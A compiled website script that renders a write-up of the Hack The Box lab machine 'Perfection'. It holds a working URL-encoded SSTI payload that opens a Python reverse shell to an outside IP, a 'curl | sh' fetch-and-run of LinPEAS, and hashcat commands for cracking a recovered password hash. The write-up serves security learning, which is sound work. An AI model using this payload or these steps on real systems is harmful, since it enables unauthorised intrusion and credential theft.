"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[7672],{69859:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>d,contentTitle:()=>i,default:()=>l,frontMatter:()=>r,metadata:()=>c,toc:()=>o});var a=n(74848),t=n(28453);const r={},i="Perfection",c={id:"writeups/htb/perfection/index",title:"Perfection",description:"A writeup for the machine Perfection on Hack The Box.",source:"@site/docs/writeups/htb/perfection/index.md",sourceDirName:"writeups/htb/perfection",slug:"/writeups/htb/perfection/",permalink:"/docs/writeups/htb/perfection/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/htb/perfection/index.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"MetaTwo",permalink:"/docs/writeups/htb/metatwo/"},next:{title:"Soccer",permalink:"/docs/writeups/htb/soccer/"}},d={},o=[{value:"Footprinting",id:"footprinting",level:2},{value:"Nmap scan",id:"nmap-scan",level:3},{value:"Web server",id:"web-server",level:3},{value:"User flag",id:"user-flag",level:2},{value:"Weight calculator",id:"weight-calculator",level:3},{value:"SSTI",id:"ssti",level:3},{value:"Reverse shell",id:"reverse-shell",level:3},{value:"Root flag",id:"root-flag",level:2},{value:"Users database",id:"users-database",level:3},{value:"First cracking attempt",id:"first-cracking-attempt",level:3},{value:"Scan with LinPEAS",id:"scan-with-linpeas",level:3},{value:"Cracking the password",id:"cracking-the-password",level:3}];function h(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,t.R)(),...e.components},{Image:r}=s;return r||function(e,s){throw new Error("Expected "+(s?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(s.h1,{id:"perfection",children:"Perfection"}),"\n",(0,a.jsxs)(s.p,{children:["A writeup for the machine ",(0,a.jsx)(s.a,{href:"https://app.hackthebox.com/machines/Perfection",children:"Perfection"})," on Hack The Box."]}),"\n",(0,a.jsx)(r,{src:n(36610).A,width:"700"}),"\n",(0,a.jsx)(s.h2,{id:"footprinting",children:"Footprinting"}),"\n",(0,a.jsx)(s.h3,{id:"nmap-scan",children:"Nmap scan"}),"\n",(0,a.jsx)(s.p,{children:"Firstly, we can start with a nmap scan."}),"\n",(0,a.jsx)(s.p,{children:"We find two open ports with one web servers publicly accessible."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"nmap -sS <HOST>\n"})}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{children:"22 -> SSH\n80 -> HTTP\n"})}),"\n",(0,a.jsx)(r,{src:n(68408).A}),"\n",(0,a.jsx)(s.h3,{id:"web-server",children:"Web server"}),"\n",(0,a.jsx)(s.p,{children:"The web server is running a simple website with an home page and a weight calculator form."}),"\n",(0,a.jsx)(r,{src:n(36080).A}),"\n",(0,a.jsx)(r,{src:n(8440).A}),"\n",(0,a.jsx)(s.p,{children:"We can try to fuzz the website to find hidden directories."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"gobuster dir -u http://<HOST> -w /usr/share/wordlists/dirb/common.txt\n"})}),"\n",(0,a.jsx)(s.p,{children:"No hidden directories are found."}),"\n",(0,a.jsxs)(s.p,{children:["If we open a 404 page, we can see that the server is running ",(0,a.jsx)(s.code,{children:"Sinatra"}),", a Ruby web framework."]}),"\n",(0,a.jsx)(r,{src:n(62400).A}),"\n",(0,a.jsx)(s.h2,{id:"user-flag",children:"User flag"}),"\n",(0,a.jsx)(s.h3,{id:"weight-calculator",children:"Weight calculator"}),"\n",(0,a.jsx)(s.p,{children:"The only interesting thing we can find is the weight calculator form."}),"\n",(0,a.jsx)(s.p,{children:"We can try to test it with Burp Repeater to see if it's vulnerable."}),"\n",(0,a.jsx)(s.p,{children:"It is required to insert an overall weight of 100 otherwise a block message is shown."}),"\n",(0,a.jsx)(s.p,{children:"If correct weights are inserted, with categories and grades as alphanumeric characters, the application shows a message with the data inserted."}),"\n",(0,a.jsx)(r,{src:n(92976).A}),"\n",(0,a.jsx)(s.h3,{id:"ssti",children:"SSTI"}),"\n",(0,a.jsx)(s.p,{children:"This last test is interesting because it seems that the application is vulnerable to Server-Side Template Injection (SSTI)."}),"\n",(0,a.jsx)(s.p,{children:"Special characters are not allowed but still the form seems vulnerable to SSTI."}),"\n",(0,a.jsx)(s.p,{children:"By looking online, we can find that %0A is a newline character and can be used to bypass the filter."}),"\n",(0,a.jsx)(s.p,{children:"After that, we have to urlencode the payload and insert it in the form."}),"\n",(0,a.jsx)(r,{src:n(16619).A}),"\n",(0,a.jsx)(s.h3,{id:"reverse-shell",children:"Reverse shell"}),"\n",(0,a.jsx)(s.p,{children:"To get a reverse shell, we can use the following payload."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{children:"category1=A%0A\n%3C%25=%20system(%22whoami%22)%20%25%3E\n%3C%25=%20%60python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.155%22,1337));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)'%60%20%25%3E\n&grade1=11&weight1=20&category2=2&grade2=11&weight2=20&category3=3&grade3=11&weight3=20&category4=4&grade4=11&weight4=20&category5=5&grade5=11&weight5=20\n"})}),"\n",(0,a.jsx)(r,{src:n(70549).A}),"\n",(0,a.jsx)(r,{src:n(34900).A}),"\n",(0,a.jsx)(s.h2,{id:"root-flag",children:"Root flag"}),"\n",(0,a.jsx)(s.h3,{id:"users-database",children:"Users database"}),"\n",(0,a.jsx)(s.p,{children:"Inside the home directory of Susan there is the source code of the web application and a folder called migration."}),"\n",(0,a.jsx)(s.p,{children:"In the latter, we can find a Sqlite database file."}),"\n",(0,a.jsx)(r,{src:n(30215).A}),"\n",(0,a.jsx)(s.p,{children:"The database contains only a table with some users and their hashed passwords."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"strings pupilpath_credentials.db\n"})}),"\n",(0,a.jsx)(r,{src:n(57415).A}),"\n",(0,a.jsx)(s.h3,{id:"first-cracking-attempt",children:"First cracking attempt"}),"\n",(0,a.jsx)(s.p,{children:"The hashing algorithm used for the password seems SHA-256."}),"\n",(0,a.jsx)(s.p,{children:"However, cracking the password with common wordlists does not give any result."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"hashcat -m 1430 -a 0 -oabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f /usr/share/wordlists/rockyou.txt\n"})}),"\n",(0,a.jsx)(s.h3,{id:"scan-with-linpeas",children:"Scan with LinPEAS"}),"\n",(0,a.jsx)(s.p,{children:"We can try to scan with LinPEAS to find interesting files and configurations."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"# In the host\nwget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh\npython3 -m http.server\n"})}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"# In the target\ncurl IP:PORT/linpeas.sh | sh\n"})}),"\n",(0,a.jsx)(r,{src:n(11542).A}),"\n",(0,a.jsx)(s.p,{children:"There is a mail file for Susan accessible both by the user and the root."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"cat /var/mail/susan\n"})}),"\n",(0,a.jsx)(r,{src:n(14309).A}),"\n",(0,a.jsx)(s.h3,{id:"cracking-the-password",children:"Cracking the password"}),"\n",(0,a.jsx)(s.p,{children:"Inside we find the correct password format."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{children:"{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}\n\nsusan_nasus_ddddddddd\n"})}),"\n",(0,a.jsx)(s.p,{children:"It is possible to use Hashcat with a specific mask to crack the password."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-sh",children:"hashcat -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d -m 1400\n"})}),"\n",(0,a.jsx)(r,{src:n(2262).A}),"\n",(0,a.jsx)(s.p,{children:"We can now login through SSH as Susan and retrieve the root flag by switching to the root user."}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-bash",children:"ssh susan@MACHINE_IP\n# ...\nsudo su\n"})})]})}function l(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,a.jsx)(s,{...e,children:(0,a.jsx)(h,{...e})}):h(e)}},36610:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/banner-ae9f8a12eb0b6d1efcadbcceea7b5882.png"},92976:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/burp-repeater-56a64a161b3800957630cf4a6ab254db.png"},16619:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/burp-ssti-bbdaf51304a491c13c83bb1eae83622d.png"},8440:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/calculator-1640d456976ac5661da73a2df4515cbe.png"},70549:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/cyberchef-f4124de379c5f88266ec7ee102bd83d1.png"},30215:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/database-80186e1d3d4d676ab147feec9b9d365a.png"},2262:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/hashcat-fc91195256735ab30183737b9c815140.png"},36080:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/homepage-4b9c5a23fef0bd06ca9f8cee81f0cd9e.png"},11542:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/linpeas-d65a2684f28ed582492155be7285fd74.png"},14309:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/mail-002173f04934553084044e6405c41b72.png"},68408:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/nmap-e69f498fce068e4c5eb1a5492c464171.png"},57415:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/password-2028451206c4a2ae4682a32db1a8aa86.png"},34900:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/rev-shell-61b43f8eed22ad3f06aff14df307c600.png"},62400:(e,s,n)=>{n.d(s,{A:()=>a});const a=n.p+"assets/images/sinatra-3d5894c00443caaae002961cf1b01d9c.png"},28453:(e,s,n)=>{n.d(s,{R:()=>i,x:()=>c});var a=n(96540);const t={},r=a.createContext(t);function i(e){const s=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),a.createElement(r.Provider,{value:s},e.children)}}}]);